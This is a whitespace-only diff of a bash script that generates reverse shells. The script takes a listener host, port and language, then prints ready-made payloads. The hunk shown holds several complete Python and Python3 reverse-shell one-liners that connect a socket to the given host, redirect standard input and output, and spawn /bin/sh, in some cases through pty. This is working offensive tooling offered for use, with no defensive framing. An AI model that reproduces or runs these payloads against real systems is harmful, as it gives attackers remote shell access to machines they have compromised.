@@ -45,8 +45,8 @@ declare -r f35='[!]'
 declare -r f36='[*]'
 
 function banner(){
-    echo ""	
-    echo -e "$CyanLight   _________.__           .__  .__         $End"
+    	echo ""	
+    	echo -e "$CyanLight   _________.__           .__  .__         $End"
 	echo -e "$CyanLight  /   _____/|  |__   ____ |  | |  | ___.__.$End"
 	echo -e "$CyanLight  \_____  \ |  |  \_/ __ \|  | |  |<   |  |$End"
 	echo -e "$CyanLight  /        \|   Y  \  ___/|  |_|  |_\___  |$End"
@@ -59,39 +59,39 @@ function banner(){
 function main(){
 	echo ""
    	echo -e "$YellowLight$f35 $GreenLight$f28 $White$f30 -h $RedLight$f4$White$f10$RedLight$f5$White -p $RedLight$f4$White$f11$RedLight$f5$White -l $RedLight$f4$White$f9$RedLight$f5$End"
-    echo ""
+    	echo ""
 }
 
 while getopts "h:p:l:" arg; do
 	case $arg in
-    	h) lh=$OPTARG; let parameter_counter+=1 ;;
+    		h) lh=$OPTARG; let parameter_counter+=1 ;;
 		p) lp=$OPTARG; let parameter_counter+=1 ;;
 		l) la=$OPTARG; let parameter_counter+=1 ;;
-    esac
+    	esac
 done
 
 if [ ! -z $lh ]; then
 	:
 else
 	banner
-    main
-    exit 0
+    	main
+    	exit 0
 fi
 
 if [ ! -z $lp ]; then
 	:
 else
 	banner
-    main
-    exit 0
+    	main
+    	exit 0
 fi
 
 if [ ! -z $la ]; then
-    :
+    	:
 else
 	banner
-    main
-    exit 0
+    	main
+    	exit 0
 fi
 
 function bash(){
@@ -160,16 +160,16 @@ function python(){
 	echo ""
 	echo -e "$RedLight$f31$GreenLight$f14$RedLight$f32$End"
 	echo ""
-    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
-    echo ""
-    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
-    echo ""
-    echo -e "$RedLight$f31$GreenLight$f15$RedLight$f32$End"
-    echo ""
-    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
-    echo ""
-    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
-    echo ""
+    	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+    	echo ""
+    	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
+    	echo ""
+    	echo -e "$RedLight$f31$GreenLight$f15$RedLight$f32$End"
+    	echo ""
+    	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+    	echo ""
+    	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lh",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'"
+    	echo ""
 }
 
 function perl(){
@@ -269,7 +269,7 @@ function start(){
  		banner
     	main
     	exit 0
-    fi
+    	fi
 }
 
 start
